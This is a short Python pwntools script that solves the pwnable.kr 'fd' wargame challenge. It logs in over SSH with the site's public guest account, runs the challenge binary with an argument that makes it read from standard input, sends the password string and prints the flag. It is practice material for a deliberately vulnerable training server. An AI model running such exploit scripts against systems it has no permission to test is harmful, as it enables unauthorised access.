#! /usr/bin/python

from pwn import *

# ssh 
s = ssh(user='fd', host='pwnable.kr', port=2222, password='guest')

# process 
p = s.process(executable='./fd',argv=['fd','4660'])

# send 'LETMEWIN'
p.sendline('LETMEWIN')

# receive flag
p.recv()
print(p.recv())

